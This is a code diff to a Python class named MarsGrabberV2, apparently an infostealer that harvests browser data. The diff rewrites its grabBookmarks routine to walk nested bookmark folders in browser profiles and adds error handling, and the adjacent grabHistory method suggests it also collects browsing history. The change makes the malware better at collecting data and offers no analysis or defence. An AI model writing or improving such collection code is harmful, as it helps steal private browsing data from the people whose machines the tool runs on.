@@ -573,59 +573,43 @@ class MarsGrabberV2(functions):
 
     def grabBookmarks(self, mkpath, platform, profile, bpath):
         self.bookmarks_temp = ''
-        num = 0
-        num2 = 0
-        num3 = 0
-        path = os.path.join(mkpath, platform, profile, bpath)
-        with open(path, encoding='utf-8') as json_file:
-            data = json.load(json_file)
-            for i in data['roots']['bookmark_bar']['children']:
-                try:
-                    name = (data['roots']['bookmark_bar']
-                            ['children'][num]['name'])
-                    type = (data['roots']['bookmark_bar']
-                            ['children'][num]['type'])
-                    try:
-                        url = (data['roots']['bookmark_bar']
-                               ['children'][num]['url'])
-                    except:
-                        url = "Error"
-                    num += 1
-                    self.stats['bookmarks'] += 1
-                    self.bookmarks_temp += (
-                        f"Name: {name}\nType: {type}\nUrl: {url}\n\n")
-                except:
-                    pass
-            for i in data['roots']['other']['children']:
-                try:
-                    name = (data['roots']['other']['children'][num2]['name'])
-                    type = (data['roots']['other']['children'][num2]['type'])
-                    try:
-                        url = (data['roots']['other']['children'][num2]['url'])
-                    except:
-                        url = "Error"
-                    num2 += 1
-                    self.stats['bookmarks'] += 1
-                    self.bookmarks_temp += (
-                        f"Name: {name}\nType: {type}\nUrl: {url}\n\n")
-                except:
-                    pass
-            for i in data['roots']['synced']['children']:
-                try:
-                    name = (data['roots']['synced']['children'][num3]['name'])
-                    type = (data['roots']['synced']['children'][num3]['type'])
-                    try:
-                        url = (data['roots']['synced']
-                               ['children'][num3]['url'])
-                    except:
-                        url = "Error"
-                    num3 += 1
-                    self.stats['bookmarks'] += 1
-                    self.bookmarks_temp += (
-                        f"Name: {name}\nType: {type}\nUrl: {url}\n\n")
-                except:
-                    pass
+        path = os.path.normpath(os.path.join(mkpath, platform, profile, bpath))
 
+        if not os.path.exists(path):
+            print(f"File not found: {path}")
+            return
+
+        try:
+           with open(path, encoding='utf-8') as json_file:
+                data = json.load(json_file)
+        except Exception as e:
+            print(f"Error reading JSON file: {e}")
+            return
+
+        def extract_bookmarks(section):
+            temp = ''
+
+            def traverse(items):
+                nonlocal temp
+                for item in items:
+                    name = item.get('name', 'Unknown')
+                    type_ = item.get('type', 'Unknown')
+                    url = item.get('url', 'Error')
+
+                    if type_ == 'folder':
+                        traverse(item.get('children', []))
+                    else:
+                        self.stats['bookmarks'] += 1
+                        temp += f"Name: {name}\nType: {type_}\nUrl: {url}\n\n"
+
+            traverse(section.get('children', []))
+            return temp
+
+        self.bookmarks_temp += extract_bookmarks(data['roots'].get('bookmark_bar', {}))
+        self.bookmarks_temp += extract_bookmarks(data['roots'].get('other', {}))
+        self.bookmarks_temp += extract_bookmarks(data['roots'].get('synced', {}))
+
+    
     def grabHistory(self, mkp, bname, pname, data):
         self.history_temp = ''
         self.down_temp = ''
